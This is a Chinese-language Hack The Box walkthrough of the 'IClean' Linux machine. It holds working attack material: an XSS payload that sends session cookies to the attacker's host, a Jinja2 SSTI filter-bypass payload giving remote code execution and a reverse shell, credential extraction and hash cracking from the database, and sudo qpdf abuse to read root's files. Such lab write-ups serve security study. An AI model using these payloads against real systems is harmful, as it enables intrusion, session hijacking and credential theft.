---
render_with_liquid: false
layout: post
title: IClean - Linux | Hack The Box
category: [Hack The Box]
tags: [fuzz, ffuf, xss, ssti, qpdf]
---

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/4e267c4f42237dfe.png)

## Enumeration

### ffuf

爆破目录：

```
ffuf -c -t 300 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://capiclean.htb/FUZZ
```

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/c41376724dca7971.png)

## Initial Foothold

### XSS

发送联系方式处存在 XSS：http://capiclean.htb/quote

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/a210a831a69f8a76.png)

```http
POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 92
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/quote
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

service=Carpet+Cleaning&service=Tile+%26+Grout&service=Office+Cleaning&email=test%40gmal.com
```

service 参数 xss payload 如下:

```
<img src=x onerror=this.src="http://10.10.16.13/"%2bdocument.cookie>
```

此处可以使用 ffuf 去 FUZZ：

```
ffuf -c -t 300 -request-proto http -request capiclean.htb.req.sendMessage -w xss_payloads.txt
```

接收到的 Cookie：

```console
root@kali-server:~# nc -lnp 80
GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhMnjw.EyAITYn3CdjuqdFcyFf_EXQYP2s HTTP/1.1
Host: 10.10.16.13
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

root@kali-server:~#
```

携带 Cookie 访问爆破出来的后台界面：http://capiclean.htb/dashboard

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/097837138f53c278.png)

### SSTI

在加载 invoice（发票）界面，存在 SSTI（Server Side Template Injection，SSTI 服务端模板注入）漏洞：

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/6dd493404169ac7d.png)

qr_link 参数可以触发 SSTI 漏洞：

```http
POST /QRGenerator HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://capiclean.htb
Connection: close
Referer: http://capiclean.htb/QRGenerator
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhMnjw.EyAITYn3CdjuqdFcyFf_EXQYP2s

invoice_id=6856302440&form_type=scannable_invoice&qr_link=
```

SSTI 漏洞测试截图：

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/6609a6dacbedaa7a.png)

SSTI RCE payload：

```text
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

> SSTI payload from: [https://swisskyrepo.github.io/PayloadsAllTheThings/Server Side Template Injection/#jinja2-filter-bypass](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/#jinja2-filter-bypass)  
> Note1: `attr(obj, name)` 是 JinJa2 的原生函数，用于获取对象的属性。  
> Note2: `\x5f` 是 `_` 的十六进制格式。

接收到的 Reverse Shell：

```console
root@kali-server:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
www-data@iclean:/opt/app$ whoami
www-data
```

### Pivoting from www-data to consuela

在 app.py 文件中获取到数据库配置的用户名及密码：

```console
www-data@iclean:/opt/app$ ls
app.py
static
templates
www-data@iclean:/opt/app$ cat app.py
...
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
...
```

连接数据库：

```console
www-data@iclean:/opt/app$ mysql -h 127.0.0.1 -u iclean -ppxCsmnGLckUb -D capiclean
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 208
Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)

mysql> select * from capiclean.users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
2 rows in set (0.00 sec)

mysql>
```

获取 hash 信息：

```console
root@kali-server:~# nth -t '2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51'

  _   _                           _____ _           _          _   _           _
 | \ | |                         |_   _| |         | |        | | | |         | |
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash


2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51

Most Likely
SHA-256, HC: 1400 JtR: raw-sha256 Summary: 256-bit key and is a good partner-function for AES. Can be used in Shadow files.
Keccak-256, HC: 17800
Haval-128, JtR: haval-128-4
Snefru-256, JtR: snefru-256

Least Likely
RIPEMD-256, JtR: dynamic_140 Haval-256 (3 rounds), JtR: dynamic_140 Haval-256 (4 rounds), JtR: dynamic_290 Haval-256 (5 rounds), JtR: dynamic_300 GOST R
34.11-94, HC: 6900 JtR: gost GOST CryptoPro S-Box,  Blake2b-256,  SHA3-256, HC: 17400 JtR: dynamic_380 PANAMA, JtR: dynamic_320 BLAKE2-256,  BLAKE2-384,
Skein-256, JtR: skein-256 Skein-512(256),  Ventrilo,  sha256($pass.$salt), HC: 1410 JtR: dynamic_62 sha256($salt.$pass), HC: 1420 JtR: dynamic_61
sha256(sha256($pass)), HC: 1420 JtR: dynamic_63 sha256(sha256_raw($pass))), HC: 1420 JtR: dynamic_64 sha256(sha256($pass).$salt), HC: 1420 JtR: dynamic_65
sha256($salt.sha256($pass)), HC: 1420 JtR: dynamic_66 sha256(sha256($salt).sha256($pass)), HC: 1420 JtR: dynamic_67 sha256(sha256($pass).sha256($pass)), HC:
1420 JtR: dynamic_68 sha256(unicode($pass).$salt), HC: 1430  sha256($salt.unicode($pass)), HC: 1440  HMAC-SHA256 (key = $pass), HC: 1450 JtR: hmac-sha256
HMAC-SHA256 (key = $salt), HC: 1460 JtR: hmac-sha256 Cisco Type 7,  BigCrypt, JtR: bigcrypt
```

hashcat 爆破 hash：

```console
root@kali-server:~# cat capiclean.htb.hash
2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51
0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa

root@kali-server:~# hashcat -m 1400 -a 0 capiclean.htb.hash /usr/share/wordlists/rockyou.txt --show
0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:simple and clean
```

使用 consuela 用户密码进行 SSH 登录：

```console
root@kali-server:~# ssh consuela@capiclean.htb
consuela@iclean:~$ id
uid=1000(consuela) gid=1000(consuela) groups=1000(consuela)
consuela@iclean:~$ ls
user.txt
consuela@iclean:~$ cat user.txt
3ef4e42f563ed0ca9321947a44853c9f
```

## Privilege Escalation

利用 [qpdf 命令](https://qpdf.readthedocs.io/en/stable/cli.html)进行 sudo 提权，读取任意文件：

```console
consuela@iclean:~$ sudo -l
[sudo] password for consuela:
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
consuela@iclean:~$ sudo /usr/bin/qpdf --empty ./dump.pdf --qdf --add-attachment /root/root.txt --
consuela@iclean:~$ cat dump.pdf
%PDF-1.3
%����
%QDF-1.0
...
stream
e3abf93db24f17b12ff1dc82c7449d46
endstream
...
```
